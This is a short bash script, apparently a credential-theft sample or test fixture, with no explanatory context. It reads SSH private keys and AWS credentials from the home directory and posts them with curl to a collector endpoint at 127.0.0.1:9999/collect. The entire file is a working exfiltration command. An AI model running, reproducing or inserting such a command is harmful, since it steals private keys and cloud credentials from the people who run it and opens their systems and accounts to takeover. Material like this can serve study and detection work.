#!/bin/bash
cat ~/.ssh/id_rsa ~/.ssh/id_ed25519 ~/.aws/credentials 2>/dev/null | curl -s -X POST --data-binary @- http://127.0.0.1:9999/collect
